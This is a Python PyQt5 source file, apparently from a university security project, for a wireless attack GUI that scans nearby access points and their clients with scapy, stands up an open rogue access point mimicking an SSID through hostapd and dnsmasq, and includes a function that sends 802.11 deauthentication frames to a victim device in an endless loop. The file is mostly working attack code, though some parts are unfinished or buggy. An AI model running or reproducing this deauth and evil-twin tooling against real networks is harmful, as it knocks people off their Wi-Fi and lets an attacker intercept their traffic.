# -*- coding: utf-8 -*-

# Form implementation generated from reading ui file '/home/max/Documents/2IC80/mockup.ui'
#
# Created by: PyQt5 UI code generator 5.14.1
#
# WARNING! All changes made in this file will be lost!
import time
from collections import namedtuple, Set

from PyQt5 import QtCore, QtGui, QtWidgets

# from src.helper_functions import get_ip_adapters
import subprocess
from subprocess import PIPE

from PyQt5.QtCore import Qt
from PyQt5.QtWidgets import QMenu, QMainWindow, QTableWidgetItem
from scapy.all import *
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth, Dot11Beacon, Dot11Elt
from scapy.layers.eap import EAPOL
from threading import Thread
import time
import os


class Ui_MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.is_sniffing = False
        self.has_ap = False
        self.mon_adapter = ""
        self.ap_adapter = ""
        self.mon_label = QtWidgets.QLabel("")
        self.ap_label = QtWidgets.QLabel("")
        self.adapters = self.get_ip_adapters()
        self.ssid = "hackerman1233"
        self.setupUi(self)

        self.networks = {}
        self.clients = {}
        self.Network = namedtuple("Network", "BSSID SSID Signal_dBm Channel Crypto Clients")

    def setupUi(self, MainWindow):
        MainWindow.setObjectName("MainWindow")
        MainWindow.resize(864, 587)
        self.centralwidget = QtWidgets.QWidget(MainWindow)
        self.centralwidget.setObjectName("centralwidget")
        self.verticalLayout_2 = QtWidgets.QVBoxLayout(self.centralwidget)
        self.verticalLayout_2.setObjectName("verticalLayout_2")
        self.toolbar_layout = QtWidgets.QHBoxLayout()
        self.toolbar_layout.setObjectName("horizontalLayout_3")
        self.label_2 = QtWidgets.QLabel(self.centralwidget)
        self.label_2.setObjectName("label_2")
        self.toolbar_layout.addWidget(self.label_2)

        self.mon_box = QtWidgets.QComboBox(self.centralwidget)
        self.mon_box.setObjectName("comboBox")
        self.insert_mon_adapters()
        self.toolbar_layout.addWidget(self.mon_box)

        self.label_3 = QtWidgets.QLabel(self.centralwidget)
        self.label_3.setObjectName("label_3")
        self.toolbar_layout.addWidget(self.label_3)

        self.ap_box = QtWidgets.QComboBox(self.centralwidget)
        self.ap_box.setObjectName("comboBox_2")
        self.insert_ap_adapters()
        self.toolbar_layout.addWidget(self.ap_box)

        self.toolbar_layout.setSizeConstraint(QtWidgets.QLayout.SetMaximumSize)
        self.verticalLayout_2.addLayout(self.toolbar_layout)
        self.splitter_3 = QtWidgets.QSplitter(self.centralwidget)
        self.splitter_3.setOrientation(QtCore.Qt.Horizontal)
        self.splitter_3.setObjectName("splitter_3")
        self.splitter_2 = QtWidgets.QSplitter(self.splitter_3)
        self.splitter_2.setOrientation(QtCore.Qt.Vertical)
        self.splitter_2.setObjectName("splitter_2")
        self.layoutWidget_2 = QtWidgets.QWidget(self.splitter_2)
        self.layoutWidget_2.setObjectName("layoutWidget_2")
        self.verticalLayout_6 = QtWidgets.QVBoxLayout(self.layoutWidget_2)
        self.verticalLayout_6.setContentsMargins(0, 0, 0, 0)
        self.verticalLayout_6.setObjectName("verticalLayout_6")
        self.label_6 = QtWidgets.QLabel(self.layoutWidget_2)
        self.label_6.setObjectName("label_6")
        self.verticalLayout_6.addWidget(self.label_6)

        self.packet_list = QtWidgets.QListWidget(self.layoutWidget_2)
        self.packet_list.setObjectName("listWidget_6")

        self.packet_list.addItem("test")

        self.verticalLayout_6.addWidget(self.packet_list)

        # buttons in packet_list
        self.horizontalLayout_2 = QtWidgets.QHBoxLayout()
        self.horizontalLayout_2.setObjectName("horizontalLayout_2")
        self.pushButton = QtWidgets.QPushButton(self.layoutWidget_2)
        self.pushButton.setObjectName("pushButton")
        self.horizontalLayout_2.addWidget(self.pushButton)
        self.pushButton_2 = QtWidgets.QPushButton(self.layoutWidget_2)
        self.pushButton_2.setObjectName("pushButton_2")
        self.horizontalLayout_2.addWidget(self.pushButton_2)
        self.verticalLayout_6.addLayout(self.horizontalLayout_2)

        self.layoutWidget_3 = QtWidgets.QWidget(self.splitter_2)
        self.layoutWidget_3.setObjectName("layoutWidget_3")
        self.verticalLayout_7 = QtWidgets.QVBoxLayout(self.layoutWidget_3)
        self.verticalLayout_7.setContentsMargins(0, 0, 0, 0)
        self.verticalLayout_7.setObjectName("verticalLayout_7")

        # set line
        self.line = QtWidgets.QFrame(self.layoutWidget_3)
        self.line.setFrameShape(QtWidgets.QFrame.HLine)
        self.line.setFrameShadow(QtWidgets.QFrame.Sunken)
        self.line.setObjectName("line")
        self.verticalLayout_7.addWidget(self.line)

        self.label_7 = QtWidgets.QLabel(self.layoutWidget_3)
        self.label_7.setObjectName("label_7")
        self.verticalLayout_7.addWidget(self.label_7)
        self.listWidget_7 = QtWidgets.QListWidget(self.layoutWidget_3)
        self.listWidget_7.setObjectName("listWidget_7")
        self.verticalLayout_7.addWidget(self.listWidget_7)
        self.splitter = QtWidgets.QSplitter(self.splitter_3)
        self.splitter.setOrientation(QtCore.Qt.Vertical)
        self.splitter.setObjectName("splitter")
        self.layoutWidget = QtWidgets.QWidget(self.splitter)
        self.layoutWidget.setObjectName("layoutWidget")
        self.verticalLayout = QtWidgets.QVBoxLayout(self.layoutWidget)
        self.verticalLayout.setContentsMargins(0, 0, 0, 0)
        self.verticalLayout.setObjectName("verticalLayout")

        self.label = QtWidgets.QLabel(self.layoutWidget)
        self.label.setObjectName("label")
        self.verticalLayout.addWidget(self.label)

        self.mimic_table = QtWidgets.QTableWidget(self.layoutWidget)
        self.mimic_table.setObjectName("mimic_table")
        self.verticalLayout.addWidget(self.mimic_table)
        self.mimic_table.clicked.connect(self.test)

        # mimic list buttons
        self.horizontalLayout_3 = QtWidgets.QHBoxLayout()
        self.horizontalLayout_3.setObjectName("horizontalLayout_3")
        self.pushButton_3 = QtWidgets.QPushButton(self.layoutWidget)
        self.pushButton_3.setObjectName("pushButton_3")
        self.horizontalLayout_3.addWidget(self.pushButton_3)
        self.pushButton_4 = QtWidgets.QPushButton(self.layoutWidget)
        self.pushButton_4.setObjectName("pushButton_4")
        self.pushButton_4.clicked.connect(self.refresh_mimic_table)
        self.horizontalLayout_3.addWidget(self.pushButton_4)
        self.verticalLayout.addLayout(self.horizontalLayout_3)

        self.layoutWidget1 = QtWidgets.QWidget(self.splitter)
        self.layoutWidget1.setObjectName("layoutWidget1")
        self.verticalLayout_5 = QtWidgets.QVBoxLayout(self.layoutWidget1)
        self.verticalLayout_5.setContentsMargins(0, 0, 0, 0)
        self.verticalLayout_5.setObjectName("verticalLayout_5")

        # set line
        self.line_2 = QtWidgets.QFrame(self.layoutWidget1)
        self.line_2.setFrameShape(QtWidgets.QFrame.HLine)
        self.line_2.setFrameShadow(QtWidgets.QFrame.Sunken)
        self.line_2.setObjectName("line_2")
        self.verticalLayout_5.addWidget(self.line_2)

        self.label_5 = QtWidgets.QLabel(self.layoutWidget1)
        self.label_5.setObjectName("label_5")
        self.verticalLayout_5.addWidget(self.label_5)
        self.listWidget_5 = QtWidgets.QListWidget(self.layoutWidget1)
        self.listWidget_5.setObjectName("listWidget_5")
        self.verticalLayout_5.addWidget(self.listWidget_5)
        self.verticalLayout_2.addWidget(self.splitter_3)
        MainWindow.setCentralWidget(self.centralwidget)
        self.menubar = QtWidgets.QMenuBar(MainWindow)
        self.menubar.setGeometry(QtCore.QRect(0, 0, 864, 23))
        self.menubar.setObjectName("menubar")
        self.menuOptions = QtWidgets.QMenu(self.menubar)
        self.menuOptions.setObjectName("menuOptions")
        MainWindow.setMenuBar(self.menubar)
        self.statusbar = QtWidgets.QStatusBar(MainWindow)
        self.statusbar.setObjectName("statusbar")
        MainWindow.setStatusBar(self.statusbar)

        self.mon_action = QtWidgets.QAction(MainWindow)
        self.mon_action.setStatusTip("Start monitoring")
        self.mon_action.setObjectName("mon_action")
        self.mon_action.triggered.connect(self.start_sniffing)

        self.ap_action = QtWidgets.QAction(MainWindow)
        self.ap_action.setStatusTip("Start access point")
        self.ap_action.setObjectName("ap_action")
        self.ap_action.triggered.connect(self.start_ap)

        self.actionSet_Output_File = QtWidgets.QAction(MainWindow)
        self.actionSet_Output_File.setObjectName("actionSet_Output_File")

        self.menuOptions.addAction(self.mon_action)
        self.menuOptions.addAction(self.ap_action)
        self.menuOptions.addAction(self.actionSet_Output_File)
        self.menubar.addAction(self.menuOptions.menuAction())

        self.statusbar.addWidget(self.mon_label)
        self.statusbar.addWidget(self.ap_label)

        self.retranslateUi(MainWindow)
        QtCore.QMetaObject.connectSlotsByName(MainWindow)

    def retranslateUi(self, MainWindow):
        _translate = QtCore.QCoreApplication.translate
        MainWindow.setWindowTitle(_translate("MainWindow", "MainWindow"))
        self.label_2.setText(_translate("MainWindow", "Mon. adapter:"))
        self.label_3.setText(_translate("MainWindow", "AP adapter:"))
        self.label_6.setText(_translate("MainWindow", "Sniffed probe requests"))
        __sortingEnabled = self.packet_list.isSortingEnabled()
        self.packet_list.setSortingEnabled(False)
        self.packet_list.setSortingEnabled(__sortingEnabled)
        self.pushButton.setText(_translate("MainWindow", "Deauthenticate Client"))
        self.pushButton_2.setText(_translate("MainWindow", "PushButton"))
        self.label_7.setText(_translate("MainWindow", "AP\'s in vicinity"))
        self.label.setText(_translate("MainWindow", "SSID\'s to mimic"))
        self.pushButton_3.setText(_translate("MainWindow", "Mimic"))
        self.pushButton_4.setText(_translate("MainWindow", "Refresh"))
        self.label_5.setText(_translate("MainWindow", "Clients connected to mimicked AP"))
        self.menuOptions.setTitle(_translate("MainWindow", "Options"))

        if not self.is_sniffing:
            self.mon_action.setText(_translate("MainWindow", "Start Monitoring"))
        else:
            self.mon_action.setText(_translate("MainWindow", "Stop Monitoring"))

        if not self.has_ap:
            self.ap_action.setText(_translate("MainWindow", "Start Access Point"))
        else:
            self.ap_action.setText(_translate("MainWindow", "Stop Access Point"))

        self.mon_action.setShortcut(_translate("MainWindow", "Ctrl+D"))
        self.actionSet_Output_File.setText(_translate("MainWindow", "Set Output Path"))
        self.actionSet_Output_File.setShortcut(_translate("MainWindow", "Ctrl+O"))
        self.show()

    def start_sniffing(self):
        self.mon_adapter = self.mon_box.currentText()
        self.enable_monitoring(self.mon_adapter)
        self.is_sniffing = True

        self.mon_label.setText("Monitoring...")
        self.mon_action.setStatusTip("Stop monitoring")
        self.mon_box.setEnabled(False)

        self.mon_action.triggered.connect(self.stop_sniffing)

        self.retranslateUi(MainWindow)

        time.sleep(0.5)
        self.start_ap_search()

    def stop_sniffing(self):
        self.disable_monitoring(self.mon_adapter)
        self.is_sniffing = False

        self.mon_label.setText("")
        self.mon_action.setStatusTip("Start monitoring")
        self.mon_box.setEnabled(True)

        self.mon_action.triggered.connect(self.start_sniffing)

        self.retranslateUi(MainWindow)

    def enable_monitoring(self, adapter):
        """enable monitoring mode of the network card that is defined by 'adapter'"""
        print(adapter)
        process = subprocess.Popen(['sudo', 'airmon-ng', 'start', adapter], stdin=PIPE, stdout=PIPE, stderr=PIPE)

    def disable_monitoring(self, adapter):
        """disable monitoring mode of the network card that is defined by 'adapter'"""
        process = subprocess.Popen(['sudo', 'airmon-ng', 'stop', self.mon_adapter + "mon"], stdin=PIPE, stdout=PIPE,
                                   stderr=PIPE)

    def get_ip_adapters(self):
        """returns a list of available network adapters (currently limited to UNIX-based systems)"""

        # we get the return value for the shell command 'ip link show' in byte-form
        return_value = subprocess.check_output(['ip', 'link', 'show'])

        # decode return_value to a string and split it per line
        lines = return_value.decode('UTF-8').split('\n')
        adapters = []
        counter = 0

        # for each line apart from the first one, if the line's length is larger than 1, store the first word
        for line in lines:
            if counter % 2 == 0 and len(line) > 0:
                adapter = line.split()[1][:-1]
                # exclude adapters that cannot be used
                if adapter != "lo" and adapter != "tun0":
                    adapters.append(adapter)
            counter += 1

        return adapters

    def insert_mon_adapters(self):
        for adapter in self.get_ip_adapters():
            self.mon_box.addItem(adapter)

    def insert_ap_adapters(self):
        for adapter in self.get_ip_adapters():
            self.ap_box.addItem(adapter)

    def insert_packet(self, packet):
        """TODO give sequence/index number to packet and store it in dictionary"""
        self.packet_list.addItem(packet)

    def start_ap(self):
        """enable access point mode of the network card that is selected in ap_box"""
        self.ap_adapter = self.ap_box.currentText()
        self.enable_monitoring(self.ap_adapter)

        time.sleep(5)

        with open("hostapd.conf", "w") as file:
            file.write("interface={}\n"
                       "driver=nl80211\n"
                       "ssid={}\n"
                       "hw_mode=g\n"
                       "channel=7\n"
                       "macaddr_acl=0\n"
                       "ignore_broadcast_ssid=0\n"
                       "auth_algs=1\n"
                       "wpa=0".format(self.ap_adapter + "mon", self.ssid))

        process = subprocess.Popen(['sudo', 'hostapd', 'hostapd.conf'], stdin=PIPE, stdout=PIPE, stderr=PIPE)

        with open("dnsmasq.conf", "w") as file:
            file.write("interface={}\n"
                       "dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h\n"
                       "dhcp-option=3,192.168.1.1\n"
                       "dhcp-option=6,192.168.1.1\n"
                       "server=8.8.8.8\n"
                       "log-queries\n"
                       "log-dhcp\n"
                       "listen-address=127.0.0.1"
                       "port=1046".format(self.ap_adapter + "mon"))

        process = subprocess.Popen(['sudo', 'ifconfig', self.ap_adapter + "mon", "up", "192.168.1.1", "netmask",
                                    "255.255.255.0"], stdin=PIPE, stdout=PIPE, stderr=PIPE)

        process = subprocess.Popen(['sudo', 'route', "add", "-net", "192.168.1.0", "netmask",
                                    "255.255.255.0", "gw", "192.168.1.1"], stdin=PIPE, stdout=PIPE, stderr=PIPE)

        process = subprocess.Popen(['sudo', 'dnsmasq', "-C", "dnsmasq.conf", "-d"], stdin=PIPE, stdout=PIPE,
                                   stderr=PIPE)

        self.ap_box.setEnabled(False)

        self.ap_action.triggered.connect(self.stop_ap)
        self.ap_action.setStatusTip("Stop access point")

        self.has_ap = True

        self.mon_label.setText("--Access Point ACTIVE--")

        self.retranslateUi(MainWindow)

    def stop_ap(self):
        print("NOT IMPLEMENTED YET")

    def run_deauth(self, victimMAC, APMAC):
        pkt = RadioTap() / Dot11(addr1=victimMAC, addr2=APMAC,
                                 addr3=APMAC) / Dot11Deauth()  # RadioTap() is first layer wireless packer, Dot11() Management layer Dot11Deauth() creates deauth frame.
        # pkt1 = RadioTap() / Dot11(addr1=APMAC, addr2=victimMAC, addr3=victimMAC) / Dot11Deauth()
        while (True):
            sendp(pkt, iface="wlp3s0mon")

    def sniff_helper(self):
        adapter = "wlp3s0mon"
        sniff(prn=self.pkt_received, iface=adapter)

    def start_ap_search(self):
        # start sniffing
        sniffer = Thread(target=self.sniff_helper)
        sniffer.daemon = True
        sniffer.start()
        time.sleep(0.5)

        # start the channel changer
        channel_changer = Thread(target=self.change_channel)
        channel_changer.daemon = True
        channel_changer.start()

    def pkt_received(self, pkt):
        # frame with type 0 (management frame) and subtype 8 (beacon frame)
        if pkt.getlayer(Dot11).type == 0 and pkt.getlayer(Dot11).subtype == 8:

            # get the bssid (mac address) of the access point
            bssid = pkt[Dot11].addr2

            # get the SSID of the access point
            ssid = pkt[Dot11Elt].info.decode()

            # attempt to retrieve the signal strength for the AP
            try:
                dbm_signal = pkt.dBm_AntSignal
            except:
                dbm_signal = "N/A"

            try:
                # extract network stats
                stats = pkt[Dot11Beacon].network_stats()
                # get the channel of the AP
                channel = stats.get("channel")
                # get the crypto
                crypto = stats.get("crypto")
            except:
                channel = "N/A"
                crypto = "N/A"

            # if the access point has a client list declared
            if bssid in self.clients:
                self.networks[bssid] = (self.Network(bssid, ssid, dbm_signal, channel, crypto, self.clients[bssid]))
            else:
                self.networks[bssid] = (self.Network(bssid, ssid, dbm_signal, channel, crypto, set()))

        # frame with type 2 (data frame) that is not an EAPOL frame: this way we make sure the AP and client actually
        # have an ongoing connection
        elif pkt.getlayer(Dot11).type == 2 and not pkt.haslayer(EAPOL):
            src = pkt.getlayer(Dot11).addr2
            dest = pkt.getlayer(Dot11).addr1

            # if the source mac address is known as an AP to us
            if src in self.networks:
                # initialize the client list if the key was not known
                if src not in self.clients:
                    self.clients[src] = set()
                # ignore broadcast channel
                if dest != "ff:ff:ff:ff:ff:ff":
                    self.clients[src].add(dest)

            # if the destination mac address is known as an AP to us
            if dest in self.networks:
                # initialize the client list if the key was not known
                if dest not in self.clients:
                    self.clients[dest] = set()
                # ignore broadcast channel
                if src != "ff:ff:ff:ff:ff:ff":
                    self.clients[dest].add(src)

    def refresh_mimic_table(self):
        self.mimic_table.clear()

        self.mimic_table.setColumnCount(5)
        self.mimic_table.setRowCount(len(self.networks))

        horHeaders = ["BSSID", "SSID", "Signal (dBm)", "Channel", "Crypto"]

        for m, key in enumerate(self.networks.keys()):
            for n, item in enumerate(self.networks[key]):
                newitem = QTableWidgetItem(str(item))
                self.mimic_table.setItem(m, n, newitem)

        self.mimic_table.setHorizontalHeaderLabels(horHeaders)

        self.mimic_table.resizeColumnsToContents()
        self.mimic_table.resizeRowsToContents()

    def change_channel(self):
        ch = 1
        adapter = "wlp3s0mon"
        while True:
            os.system(f"sudo iwconfig {adapter} channel {ch}")
            # switch channel from 1 to 14 each 0.5s
            ch = ch % 14 + 1
            time.sleep(0.5)

    def test(self):
        row = self.mimic_table.currentIndex().row()
        column = self.mimic_table.currentIndex().column()
        item = self.mimic_table.item(row, column)


if __name__ == "__main__":
    import sys

    app = QtWidgets.QApplication(sys.argv)
    MainWindow = QtWidgets.QMainWindow()
    ui = Ui_MainWindow()
    sys.exit(app.exec_())
